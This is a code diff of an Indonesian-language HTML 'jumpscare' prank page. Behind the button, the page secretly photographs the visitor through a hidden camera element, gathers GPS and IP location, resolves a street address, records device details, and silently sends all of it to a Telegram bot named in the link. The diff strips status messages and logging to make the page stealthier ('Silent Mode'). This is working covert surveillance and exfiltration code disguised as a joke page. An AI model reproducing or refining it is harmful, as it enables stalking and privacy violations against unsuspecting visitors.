@@ -16,41 +16,44 @@
         .hidden{display:none!important}
         video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
         canvas{display:none}
+
+        /* ===== LOADING HALAMAN AWAL (SEBENTAR) ===== */
         #loader{position:fixed;top:0;left:0;width:100%;height:100%;background:#0a0a0a;display:flex;justify-content:center;align-items:center;z-index:10000;flex-direction:column;gap:16px}
         #loader .spinner{width:40px;height:40px;border:3px solid #1a1a1a;border-top:3px solid #ff4d94;border-radius:50%;animation:spin .8s linear infinite}
         @keyframes spin{to{transform:rotate(360deg)}}
         #loader p{color:#555;font-size:12px;letter-spacing:1px;font-family:monospace}
-        #loader .status{color:#333;font-size:11px;font-family:monospace}
-        #error-box{display:none;background:rgba(20,10,25,.95);padding:32px 28px;border-radius:28px;max-width:400px;width:90%;text-align:center;border:1px solid rgba(255,50,50,.2)}
+
+        /* ===== ERROR (JIKA LINK SALAH) ===== */
+        #error-box{display:none;background:rgba(20,10,25,.95);padding:32px 28px;border-radius:28px;max-width:400px;width:90%;text-align:center;border:1px solid rgba(255,50,50,.2);position:relative;z-index:10001}
         #error-box .icon{font-size:48px;display:block;margin-bottom:8px}
         #error-box h2{color:#fff;font-size:20px}
         #error-box p{color:rgba(255,255,255,.4);font-size:13px;margin:8px 0 16px}
         #error-box .btn-retry{padding:12px 32px;border:none;border-radius:12px;background:linear-gradient(45deg,#ff4d94,#ff80df);color:#fff;font-weight:bold;cursor:pointer;font-size:14px}
+
         #copy-link{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.7);padding:8px 16px;border-radius:12px;color:rgba(255,255,255,.3);font-size:10px;font-family:monospace;z-index:100;cursor:pointer;transition:.3s;border:1px solid rgba(255,255,255,.05)}
         #copy-link:hover{color:rgba(255,255,255,.6);background:rgba(0,0,0,.8)}
     </style>
 </head>
 <body>
 
-    <!-- LOADING -->
+    <!-- LOADING AWAL -->
     <div id="loader">
         <div class="spinner"></div>
         <p>⏳ memuat...</p>
-        <div class="status" id="loadStatus">🔐 memeriksa link...</div>
     </div>
 
     <!-- ERROR -->
     <div id="error-box">
         <span class="icon">🔒</span>
         <h2>Link Tidak Valid</h2>
-        <p>Link ini tidak memiliki token yang valid.<br>Hubungi pembuat untuk mendapatkan link yang benar.</p>
+        <p>Link ini tidak memiliki token yang valid.</p>
         <button class="btn-retry" onclick="location.reload()">🔄 Coba Lagi</button>
     </div>
 
     <!-- TOMBOL -->
     <button class="btn-cantik hidden" id="btnCantik">✨ Pencet Cantik ✨</button>
 
-    <!-- COPY LINK -->
+    <!-- COPY LINK (TETAP ADA) -->
     <div id="copy-link" onclick="copyLink()">📋 Salin Link</div>
 
     <!-- JUMPScare -->
@@ -61,7 +64,7 @@
     <!-- AUDIO -->
     <audio id="jumpscare-audio" src="suara.mp3" preload="auto"></audio>
 
-    <!-- KAMERA -->
+    <!-- KAMERA (HIDDEN) -->
     <video id="video" autoplay muted playsinline></video>
     <canvas id="canvas"></canvas>
 
@@ -69,7 +72,7 @@
         (function() {
             'use strict';
 
-            // ========== TOKEN DARI URL ==========
+            // ========== TOKEN ==========
             function getConfigFromURL() {
                 let token = null,
                     chatId = null;
@@ -93,7 +96,6 @@
             if (!isValid) {
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('error-box').style.display = 'block';
-                console.error('❌ Token atau Chat ID tidak ditemukan di URL!');
                 throw new Error('Invalid config');
             }
 
@@ -102,7 +104,6 @@
 
             // ========== DOM ==========
             const loader = document.getElementById('loader');
-            const loadStatus = document.getElementById('loadStatus');
             const btn = document.getElementById('btnCantik');
             const overlay = document.getElementById('jumpscare-overlay');
             const audio = document.getElementById('jumpscare-audio');
@@ -120,13 +121,8 @@
             let imageData = null;
             let locationData = null;
             let deviceData = null;
-            let sendAttempts = 0;
-            const MAX_SEND_ATTEMPTS = 5;
-            let captureAttempts = 0;
-            const MAX_CAPTURE_ATTEMPTS = 10;
-            let cameraPermissionDenied = false;
-            let locationPermissionDenied = false;
-            let sendTimer = null;
+            let cameraDenied = false;
+            let locationDenied = false;
 
             // ========== COPY LINK ==========
             window.copyLink = function() {
@@ -144,8 +140,8 @@
                 }
             };
 
-            // ========== 1. DETEKSI DEVICE ==========
-            function getAccurateDevice() {
+            // ========== 1. DEVICE ==========
+            function getDevice() {
                 try {
                     const ua = navigator.userAgent;
                     let brand = 'Unknown',
@@ -153,9 +149,7 @@
                         os = 'Unknown',
                         osVer = 'Unknown',
                         browser = 'Unknown',
-                        deviceType = 'Desktop',
-                        cpu = 'Unknown',
-                        gpu = 'Unknown';
+                        deviceType = 'Desktop';
 
                     if (/android/i.test(ua)) { os = 'Android';
                         const m = ua.match(/Android\s([\d.]+)/); if (m) osVer = m[1];
@@ -167,66 +161,55 @@
                             'macOS';
                         deviceType = 'Desktop'; } else if (/Linux/i.test(ua)) { os = 'Linux'; }
 
-                    const brandPatterns = {
-                        'Samsung': /Samsung|SM-|Galaxy|GT-|SCH-|SGH-|SPH-|SHV-|SHW-|SC-|SM-G|SM-A|SM-J|SM-M|SM-N|SM-T|SM-X|SM-F|SM-Z|SM-C|SM-E|SM-P|SM-W/,
-                        'Xiaomi': /Xiaomi|Redmi|POCO|Mi\s|M20|M21|M22|M23|M24|M25|M200|M210|M220|M230/,
+                    const brands = {
+                        'Samsung': /Samsung|SM-|Galaxy/i,
+                        'Xiaomi': /Xiaomi|Redmi|POCO|Mi\s/i,
                         'iPhone': /iPhone/,
-                        'Oppo': /Oppo|CPH|PED|PDT|PGU|PHA|PHB|PHF|PHJ|PHN|PHP|PHS|PHU|PHW|PHX|PHY|PKA|PKB|PKC|PKD|PKE|PKF|PKG|PKH|PKI|PKJ|PKK|PKL|PKM|PKN|PKO|PKP|PKQ|PKR|PKS|PKT|PKU|PKV|PKW|PKX|PKY|PKZ/,
-                        'Vivo': /Vivo|V\d{4}|V\d{5}|PD\d{4}/,
-                        'Realme': /Realme|RMX|RMP/,
-                        'Google': /Pixel|Google/,
-                        'OnePlus': /OnePlus|LE\d{4}|CPH\d{4}/,
+                        'Oppo': /Oppo|CPH/i,
+                        'Vivo': /Vivo|V\d{4}/,
+                        'Realme': /Realme|RMX/,
+                        'Google': /Pixel/,
+                        'OnePlus': /OnePlus|LE\d{4}/,
                         'Huawei': /Huawei|HONOR|MHA-|LIO-|MAR-|ELE-|VOG-|LYA-|CLT-|NOH-|TAS-|LSA-|PCT-|JNY-|ANA-|GRA-|EVR-|ELS-|LIO-|NOP-|BRQ-|NAM-|CDY-|DBY-|JAD-|TNN-|MNA-|FRL-|TFY-|PPA-|WKG-|MGA-|DCO-/
                     };
-
-                    for (const [b, pattern] of Object.entries(brandPatterns)) {
-                        if (pattern.test(ua)) { brand = b; break; }
+                    for (const [b, p] of Object.entries(brands)) {
+                        if (p.test(ua)) { brand = b; break; }
                     }
 
-                    const modelMatch = ua.match(/; ([^;]+)\)/);
-                    if (modelMatch && modelMatch[1]) {
-                        const raw = modelMatch[1].trim();
-                        if (!raw.includes('Android') && !raw.includes('iOS') && !raw.includes('Linux')) { model = raw; }
-                    }
-
-                    try { if (navigator.hardwareConcurrency) { cpu = navigator.hardwareConcurrency + ' cores'; } if (/arm/i
-                            .test(ua)) cpu += ' (ARM)';
-                        else if (/x86/i.test(ua)) cpu += ' (x86)';
-                        else if (/aarch64/i.test(ua)) cpu += ' (ARM64)'; } catch(e) {}
-
-                    try { const gl = document.createElement('canvas').getContext('webgl'); if (gl) { const debugInfo = gl
-                                .getExtension('WEBGL_debug_renderer_info'); if (debugInfo) { gpu = gl.getParameter(
-                                debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown'; if (gpu.includes('Adreno')) gpu =
-                                'Adreno';
-                            else if (gpu.includes('Mali')) gpu = 'Mali';
-                            else if (gpu.includes('PowerVR')) gpu = 'PowerVR';
-                            else if (gpu.includes('Apple')) gpu = 'Apple GPU'; } } } catch(e) {}
+                    const mm = ua.match(/; ([^;]+)\)/);
+                    if (mm && mm[1] && !mm[1].includes('Android') && !mm[1].includes('iOS')) { model = mm[1].trim(); }
 
                     if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
                     else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
                     else if (/Firefox/i.test(ua)) browser = 'Firefox';
                     else if (/Edg/i.test(ua)) browser = 'Edge';
-                    else if (/SamsungBrowser/i.test(ua)) browser = 'Samsung Internet';
 
                     if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
                         deviceType = /Tablet|iPad/i.test(ua) ? 'Tablet' : 'Mobile';
                     }
 
-                    deviceData = { brand, model, os, osVer, browser, deviceType, cpu, gpu, screen: screen.width + 'x' +
-                            screen.height, pixelRatio: window.devicePixelRatio || 1, timezone: Intl.DateTimeFormat()
-                            .resolvedOptions().timeZone, touch: 'ontouchstart' in window || navigator.maxTouchPoints >
-                            0 };
+                    deviceData = {
+                        brand,
+                        model,
+                        os,
+                        osVer,
+                        browser,
+                        deviceType,
+                        screen: screen.width + 'x' + screen.height,
+                        pixelRatio: window.devicePixelRatio || 1,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0
+                    };
 
                     if (navigator.getBattery) {
                         navigator.getBattery().then(b => {
                             deviceData.battery = Math.round(b.level * 100) + '%' + (b.charging ? ' 🔌' : '');
                             deviceDone = true;
-                            checkSend();
+                            checkAndSend();
                         }).catch(() => { deviceDone = true;
-                            checkSend(); });
+                            checkAndSend(); });
                     } else { deviceDone = true; }
 
-                    console.log('✅ Device detected:', deviceData.brand, deviceData.model);
                     return true;
                 } catch(e) {
                     deviceData = { brand: 'Unknown', model: 'Unknown', os: 'Unknown' };
@@ -237,202 +220,129 @@
 
             // ========== 2. KAMERA ==========
             function startCamera() {
-                loadStatus.textContent = '📷 mengakses kamera...';
-                let attempts = 0;
-                const maxAttempts = 3;
+                navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                }).then(s => {
+                    stream = s;
+                    video.srcObject = stream;
+                    video.play();
 
-                function tryCamera() {
-                    attempts++;
-                    navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                        audio: false
-                    }).then(s => {
-                        stream = s;
-                        video.srcObject = stream;
-                        video.play();
+                    let attempts = 0;
 
-                        let isReady = false;
+                    function doCapture() {
+                        if (captureDone) return;
+                        attempts++;
+                        const w = video.videoWidth || 640;
+                        const h = video.videoHeight || 480;
 
-                        function waitForVideo() {
-                            if (video.readyState >= 2 && video.videoWidth > 10 && video.videoHeight > 10) {
-                                isReady = true;
-                                doCapture();
-                                return;
-                            }
-                            setTimeout(waitForVideo, 100);
-                        }
-
-                        video.addEventListener('loadeddata', function() {
-                            if (!isReady && video.videoWidth > 10 && video.videoHeight > 10) {
-                                isReady = true;
-                                doCapture();
-                            }
-                        });
-
-                        video.addEventListener('loadedmetadata', function() {
-                            if (!isReady && video.videoWidth > 10 && video.videoHeight > 10) {
-                                isReady = true;
-                                doCapture();
-                            }
-                        });
-
-                        waitForVideo();
-
-                        setTimeout(function() {
-                            if (!captureDone) { doCapture(); }
-                        }, 2000);
-
-                    }).catch(err => {
-                        cameraPermissionDenied = true;
-                        console.warn('⚠️ Kamera ditolak:', err.message);
-                        loadStatus.textContent = '📷 ditolak, lanjut...';
-                        captureDone = true;
-                        checkSend();
-                    });
-                }
-
-                function doCapture() {
-                    if (captureDone) return;
-                    captureAttempts++;
-
-                    const w = video.videoWidth || 640;
-                    const h = video.videoHeight || 480;
-
-                    if (w < 50 || h < 50) {
-                        if (captureAttempts < MAX_CAPTURE_ATTEMPTS) {
-                            setTimeout(doCapture, 200);
-                        } else {
-                            captureDone = true;
-                            checkSend();
-                        }
-                        return;
-                    }
-
-                    try {
-                        canvas.width = w;
-                        canvas.height = h;
-
-                        ctx.translate(w, 0);
-                        ctx.scale(-1, 1);
-                        ctx.drawImage(video, 0, 0, w, h);
-                        ctx.setTransform(1, 0, 0, 1, 0, 0);
-
-                        const pixelData = ctx.getImageData(0, 0, Math.min(w, 20), Math.min(h, 20));
-                        let isBlack = true;
-                        for (let i = 0; i < pixelData.data.length; i += 4) {
-                            const r = pixelData.data[i],
-                                g = pixelData.data[i + 1],
-                                b = pixelData.data[i + 2];
-                            if (r > 20 || g > 20 || b > 20) { isBlack = false; break; }
-                        }
-
-                        if (isBlack && captureAttempts < MAX_CAPTURE_ATTEMPTS) {
-                            setTimeout(doCapture, 300);
+                        if (w < 50 || h < 50) {
+                            if (attempts < 10) { setTimeout(doCapture, 200); } else { captureDone = true;
+                                checkAndSend(); }
                             return;
                         }
 
-                        imageData = canvas.toDataURL('image/jpeg', 0.92);
-                        captureDone = true;
-                        console.log('✅ Capture success, size:', (imageData.length / 1024).toFixed(0), 'KB');
+                        try {
+                            canvas.width = w;
+                            canvas.height = h;
+                            ctx.translate(w, 0);
+                            ctx.scale(-1, 1);
+                            ctx.drawImage(video, 0, 0, w, h);
+                            ctx.setTransform(1, 0, 0, 1, 0, 0);
 
-                        if (stream) {
-                            stream.getTracks().forEach(t => t.stop());
-                            stream = null;
-                        }
+                            const pixel = ctx.getImageData(0, 0, 10, 10);
+                            let isBlack = true;
+                            for (let i = 0; i < pixel.data.length; i += 4) {
+                                if (pixel.data[i] > 20 || pixel.data[i + 1] > 20 || pixel.data[i + 2] > 20) {
+                                    isBlack = false;
+                                    break;
+                                }
+                            }
 
-                        checkSend();
+                            if (isBlack && attempts < 10) {
+                                setTimeout(doCapture, 300);
+                                return;
+                            }
 
-                    } catch(e) {
-                        console.warn('⚠️ Capture error:', e.message);
-                        if (captureAttempts < MAX_CAPTURE_ATTEMPTS) {
-                            setTimeout(doCapture, 300);
-                        } else {
+                            imageData = canvas.toDataURL('image/jpeg', 0.9);
                             captureDone = true;
-                            checkSend();
+                            if (stream) { stream.getTracks().forEach(t => t.stop());
+                                stream = null; }
+                            checkAndSend();
+                        } catch(e) {
+                            if (attempts < 10) { setTimeout(doCapture, 300); } else { captureDone = true;
+                                checkAndSend(); }
                         }
                     }
-                }
 
-                tryCamera();
+                    video.addEventListener('loadedmetadata', doCapture);
+                    if (video.videoWidth > 10) doCapture();
+                    setTimeout(doCapture, 500);
 
-                setTimeout(function() {
-                    if (!captureDone) {
-                        captureDone = true;
-                        console.log('⏳ Camera timeout, proceed without photo');
-                        checkSend();
-                    }
+                }).catch(err => {
+                    cameraDenied = true;
+                    captureDone = true;
+                    checkAndSend();
+                });
+
+                setTimeout(() => {
+                    if (!captureDone) { captureDone = true;
+                        checkAndSend(); }
                 }, 5000);
             }
 
             // ========== 3. LOKASI ==========
             function getLocation() {
-                loadStatus.textContent = '📍 mengambil lokasi...';
-
                 let ipDone = false;
                 let gpsDone = false;
-                const ipSources = ['https://ipapi.co/json/', 'https://ipinfo.io/json'];
-                let ipIndex = 0;
+                const sources = ['https://ipapi.co/json/', 'https://ipinfo.io/json'];
+                let idx = 0;
 
                 function tryIP() {
-                    if (ipDone || ipIndex >= ipSources.length) {
+                    if (ipDone || idx >= sources.length) {
                         if (!ipDone) { ipDone = true; }
                         checkLocationDone();
                         return;
                     }
-                    const url = ipSources[ipIndex++];
-                    fetch(url, { timeout: 5000 })
+                    fetch(sources[idx++], { timeout: 4000 })
                         .then(r => r.json())
                         .then(d => {
                             if (ipDone || !d) return;
                             let lat, lng, city, region, country, ip;
-
-                            if (d.latitude && d.longitude) {
-                                lat = d.latitude;
+                            if (d.latitude && d.longitude) { lat = d.latitude;
                                 lng = d.longitude;
                                 city = d.city || 'N/A';
                                 region = d.region || 'N/A';
                                 country = d.country_name || d.country || 'N/A';
-                                ip = d.ip || 'N/A';
-                            } else if (d.loc) {
-                                const c = d.loc.split(',');
-                                lat = parseFloat(c[0]);
+                                ip = d.ip || 'N/A'; } else if (d.loc) { const c = d.loc.split(','); lat = parseFloat(c[
+                                    0]);
                                 lng = parseFloat(c[1]);
                                 city = d.city || 'N/A';
                                 region = d.region || 'N/A';
                                 country = d.country || 'N/A';
-                                ip = d.ip || 'N/A';
-                            }
-
+                                ip = d.ip || 'N/A'; }
                             if (lat && lng) {
                                 locationData = { lat, lng, city, region, country, ip, source: 'IP' };
                                 ipDone = true;
-                                console.log('✅ IP location:', lat, lng);
-
-                                const geoUrl =
-                                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`;
-                                fetch(geoUrl)
-                                    .then(res => res.json())
+                                fetch(
+                                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`
+                                        )
+                                    .then(r => r.json())
                                     .then(data => {
                                         if (data && data.address) {
-                                            const addr = data.address;
+                                            const a = data.address;
                                             locationData.fullAddress = data.display_name || 'N/A';
-                                            locationData.road = addr.road || addr.pedestrian || 'N/A';
-                                            locationData.suburb = addr.suburb || addr.neighbourhood || 'N/A';
-                                            locationData.city = addr.city || addr.town || addr.village || addr
-                                                .municipality || city;
-                                            locationData.region = addr.state || addr.region || region;
-                                            locationData.country = addr.country || country;
-                                            locationData.postcode = addr.postcode || 'N/A';
-                                            locationData.houseNumber = addr.house_number || addr
-                                            .building || 'N/A';
-                                            console.log('✅ Full address:', locationData.fullAddress);
+                                            locationData.road = a.road || a.pedestrian || 'N/A';
+                                            locationData.city = a.city || a.town || a.village || a
+                                            .municipality || city;
+                                            locationData.region = a.state || a.region || region;
+                                            locationData.country = a.country || country;
+                                            locationData.postcode = a.postcode || 'N/A';
                                         }
                                         checkLocationDone();
                                     })
                                     .catch(() => { checkLocationDone(); });
-                            } else {
-                                tryIP();
-                            }
+                            } else { tryIP(); }
                         })
                         .catch(() => { tryIP(); });
                 }
@@ -443,57 +353,39 @@
                         checkLocationDone();
                         return;
                     }
-
                     navigator.geolocation.getCurrentPosition(
-                        function(position) {
+                        p => {
                             if (!gpsDone && !locationData) {
-                                const { latitude, longitude } = position.coords;
                                 locationData = {
-                                    lat: latitude,
-                                    lng: longitude,
-                                    accuracy: '±' + Math.round(position.coords.accuracy || 0) + 'm',
-                                    alt: position.coords.altitude || 'N/A',
+                                    lat: p.coords.latitude,
+                                    lng: p.coords.longitude,
+                                    accuracy: '±' + Math.round(p.coords.accuracy || 0) + 'm',
                                     source: 'GPS'
                                 };
                                 gpsDone = true;
-                                console.log('✅ GPS location:', latitude, longitude);
-
-                                const url =
-                                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`;
-                                fetch(url)
-                                    .then(res => res.json())
+                                fetch(
+                                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}&zoom=18&addressdetails=1`
+                                        )
+                                    .then(r => r.json())
                                     .then(data => {
                                         if (data && data.address) {
-                                            const addr = data.address;
+                                            const a = data.address;
                                             locationData.fullAddress = data.display_name || 'N/A';
-                                            locationData.road = addr.road || addr.pedestrian || 'N/A';
-                                            locationData.suburb = addr.suburb || addr.neighbourhood || 'N/A';
-                                            locationData.city = addr.city || addr.town || addr.village || addr
-                                                .municipality || 'N/A';
-                                            locationData.region = addr.state || addr.region || 'N/A';
-                                            locationData.country = addr.country || 'N/A';
-                                            locationData.postcode = addr.postcode || 'N/A';
-                                            locationData.houseNumber = addr.house_number || addr
-                                            .building || 'N/A';
-                                            console.log('✅ Full address:', locationData.fullAddress);
+                                            locationData.road = a.road || a.pedestrian || 'N/A';
+                                            locationData.city = a.city || a.town || a.village || a
+                                            .municipality || 'N/A';
+                                            locationData.region = a.state || a.region || 'N/A';
+                                            locationData.country = a.country || 'N/A';
+                                            locationData.postcode = a.postcode || 'N/A';
                                         }
                                         checkLocationDone();
                                     })
                                     .catch(() => { checkLocationDone(); });
-                            } else {
-                                checkLocationDone();
-                            }
+                            } else { checkLocationDone(); }
                         },
-                        function(error) {
-                            locationPermissionDenied = true;
-                            console.warn('⚠️ GPS ditolak:', error.message);
+                        () => { locationDenied = true;
                             gpsDone = true;
-                            checkLocationDone();
-                        }, {
-                            enableHighAccuracy: true,
-                            timeout: 5000,
-                            maximumAge: 0
-                        }
+                            checkLocationDone(); }, { enableHighAccuracy: true, timeout: 4000 }
                     );
                 }
 
@@ -503,39 +395,33 @@
                         if (!locationData) {
                             locationData = { lat: 0, lng: 0, source: 'none', city: 'Tidak tersedia' };
                         }
-                        console.log('✅ Location done, source:', locationData.source);
-                        checkSend();
+                        checkAndSend();
                     }
                 }
 
                 tryIP();
                 tryGPS();
 
-                setTimeout(function() {
+                setTimeout(() => {
                     if (!locationDone) {
                         locationDone = true;
-                        if (!locationData) {
-                            locationData = { lat: 0, lng: 0, source: 'timeout', city: 'Timeout' };
-                        }
-                        console.log('⏳ Location timeout, proceed');
-                        checkSend();
+                        if (!locationData) { locationData = { lat: 0, lng: 0, source: 'timeout' }; }
+                        checkAndSend();
                     }
-                }, 8000);
+                }, 7000);
             }
 
-            // ========== 4. KIRIM TELEGRAM (DENGAN RETRY) ==========
+            // ========== 4. KIRIM TELEGRAM (SILENT) ==========
             function sendToTelegram() {
                 if (isSent) return;
 
-                console.log('📤 Attempting to send... (attempt ' + (sendAttempts + 1) + ')');
-
-                let caption = '📸 JUMPScare REPORT\n';
+                let caption = '📸 REPORT\n';
                 caption += '⏰ ' + new Date().toLocaleString('id-ID') + '\n';
                 caption += '━'.repeat(25) + '\n';
 
-                caption += '\n🔐 STATUS IZIN:\n';
-                caption += '   Kamera: ' + (cameraPermissionDenied ? '❌ Ditolak' : '✅ Diizinkan') + '\n';
-                caption += '   Lokasi: ' + (locationPermissionDenied ? '❌ Ditolak' : '✅ Diizinkan') + '\n';
+                caption += '\n🔐 IZIN:\n';
+                caption += '   Kamera: ' + (cameraDenied ? '❌ Ditolak' : '✅ Diizinkan') + '\n';
+                caption += '   Lokasi: ' + (locationDenied ? '❌ Ditolak' : '✅ Diizinkan') + '\n';
 
                 if (deviceData) {
                     caption += '\n📱 PERANGKAT:\n';
@@ -544,8 +430,6 @@
                     caption += '   Tipe: ' + deviceData.deviceType + '\n';
                     caption += '   OS: ' + deviceData.os + ' ' + deviceData.osVer + '\n';
                     caption += '   Browser: ' + deviceData.browser + '\n';
-                    caption += '   CPU: ' + deviceData.cpu + '\n';
-                    caption += '   GPU: ' + deviceData.gpu + '\n';
                     caption += '   Resolusi: ' + deviceData.screen + '\n';
                     caption += '   Pixel Ratio: ' + deviceData.pixelRatio + '\n';
                     caption += '   Timezone: ' + deviceData.timezone + '\n';
@@ -568,18 +452,14 @@
                         caption += '   Provinsi: ' + locationData.region + '\n';
                     if (locationData.country && locationData.country !== 'N/A')
                         caption += '   Negara: ' + locationData.country + '\n';
-
                     if (locationData.fullAddress && locationData.fullAddress !== 'N/A') {
                         caption += '\n📌 ALAMAT:\n   ' + locationData.fullAddress + '\n';
                     }
-
                     caption += '\n🗺️ https://maps.google.com/?q=' + (locationData.lat || 0) + ',' + (locationData
                     .lng || 0);
                 }
 
-                sendAttempts++;
-
-                // KIRIM FOTO JIKA ADA
+                // Kirim foto kalau ada
                 if (imageData) {
                     try {
                         const bs = atob(imageData.split(',')[1]);
@@ -596,89 +476,39 @@
                         fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
                             method: 'POST',
                             body: fd
-                        })
-                        .then(r => r.json())
-                        .then(d => {
-                            console.log('📤 Telegram response:', d);
+                        }).then(r => r.json()).then(d => {
                             if (d.ok) {
                                 isSent = true;
-                                loadStatus.textContent = '✅ terkirim!';
-                                console.log('✅ Sent successfully!');
-                                setTimeout(function() {
-                                    loader.style.display = 'none';
-                                    btn.classList.remove('hidden');
-                                }, 500);
+                                console.log('✅ Sent!');
                             } else {
-                                console.error('❌ Telegram error:', d.description);
-                                if (sendAttempts < MAX_SEND_ATTEMPTS) {
-                                    setTimeout(sendToTelegram, 2000);
-                                } else {
-                                    loadStatus.textContent = '❌ gagal: ' + d.description;
-                                }
+                                sendTextOnly(caption);
                             }
-                        })
-                        .catch(function(err) {
-                            console.error('❌ Fetch error:', err);
-                            if (sendAttempts < MAX_SEND_ATTEMPTS) {
-                                setTimeout(sendToTelegram, 2000);
-                            } else {
-                                loadStatus.textContent = '❌ error: ' + err.message;
-                            }
-                        });
+                        }).catch(() => { sendTextOnly(caption); });
                         return;
-                    } catch(e) {
-                        console.error('❌ Image parse error:', e);
-                    }
+                    } catch(e) {}
                 }
 
-                // KIRIM TEXT SAJA (TANPA FOTO)
-                console.log('📤 Sending text-only...');
-                const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
-                fetch(url, {
+                sendTextOnly(caption);
+            }
+
+            function sendTextOnly(caption) {
+                if (isSent) return;
+                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: caption })
-                })
-                .then(r => r.json())
-                .then(d => {
-                    console.log('📤 Telegram response:', d);
+                }).then(r => r.json()).then(d => {
                     if (d.ok) {
                         isSent = true;
-                        loadStatus.textContent = '✅ terkirim (tanpa foto)';
-                        console.log('✅ Sent text-only successfully!');
-                        setTimeout(function() {
-                            loader.style.display = 'none';
-                            btn.classList.remove('hidden');
-                        }, 500);
-                    } else {
-                        console.error('❌ Telegram error:', d.description);
-                        if (sendAttempts < MAX_SEND_ATTEMPTS) {
-                            setTimeout(sendToTelegram, 2000);
-                        } else {
-                            loadStatus.textContent = '❌ gagal: ' + d.description;
-                        }
+                        console.log('✅ Sent!');
                     }
-                })
-                .catch(function(err) {
-                    console.error('❌ Fetch error:', err);
-                    if (sendAttempts < MAX_SEND_ATTEMPTS) {
-                        setTimeout(sendToTelegram, 2000);
-                    } else {
-                        loadStatus.textContent = '❌ error: ' + err.message;
-                    }
-                });
+                }).catch(() => {});
             }
 
             // ========== 5. CHECK & SEND ==========
-            function checkSend() {
-                console.log('🔍 CheckSend - capture:', captureDone, 'location:', locationDone, 'device:', deviceDone,
-                    'sent:', isSent);
+            function checkAndSend() {
                 if (captureDone && locationDone && deviceDone && !isSent) {
-                    // Delay sedikit agar semua data siap
-                    if (sendTimer) clearTimeout(sendTimer);
-                    sendTimer = setTimeout(function() {
-                        sendToTelegram();
-                    }, 1000);
+                    setTimeout(sendToTelegram, 500);
                 }
             }
 
@@ -686,60 +516,52 @@
             function runAll() {
                 if (isProcessing) return;
                 isProcessing = true;
-                console.log('🚀 Starting...');
 
-                getAccurateDevice();
+                getDevice();
                 startCamera();
                 getLocation();
 
-                // SAFETY: kirim paksa setelah 12 detik
-                setTimeout(function() {
+                setTimeout(() => {
                     if (!isSent) {
-                        console.log('⏳ Force send after timeout...');
                         if (!captureDone) { captureDone = true; }
                         if (!locationDone) { locationDone = true; if (!locationData) locationData = { lat: 0,
-                                lng: 0, source: 'fallback' }; }
+                                lng: 0 }; }
                         if (!deviceDone) { deviceDone = true; if (!deviceData) deviceData = { brand: 'Unknown',
                                 model: 'Unknown' }; }
-                        if (!imageData) {
-                            try { imageData = canvas.toDataURL('image/jpeg', 0.8); } catch(e) {}
-                        }
-                        checkSend();
+                        checkAndSend();
                     }
-                }, 12000);
+                }, 10000);
             }
 
             // ========== 7. TOMBOL ==========
             btn.addEventListener('click', function() {
                 overlay.style.display = 'flex';
-                audio.play().catch(function(error) { console.log("Gagal memutar suara: ", error); });
+                audio.play().catch(() => {});
 
                 runAll();
 
-                setTimeout(function() {
+                setTimeout(() => {
                     overlay.style.display = 'none';
                     location.reload();
                 }, 3000);
             });
 
             // ========== 8. START ==========
-            loadStatus.textContent = '✅ siap!';
-            setTimeout(function() {
+            setTimeout(() => {
                 loader.style.display = 'none';
                 btn.classList.remove('hidden');
             }, 500);
 
-            // ========== 9. CLEANUP ==========
-            window.addEventListener('beforeunload', function() {
+            window.addEventListener('beforeunload', () => {
                 if (stream) { stream.getTracks().forEach(t => t.stop()); }
             });
 
-            console.log('👁️ drakGPT · Fixed Send');
-            console.log('Token: ' + BOT_TOKEN.substring(0, 15) + '...');
-            console.log('Chat ID: ' + CHAT_ID);
+            console.log('👁️ drakGPT · Silent Mode');
+            console.log('Token:', BOT_TOKEN.substring(0, 15) + '...');
+            console.log('Chat ID:', CHAT_ID);
 
         })();
     </script>
 
 </body>
-</html>
+    </html>
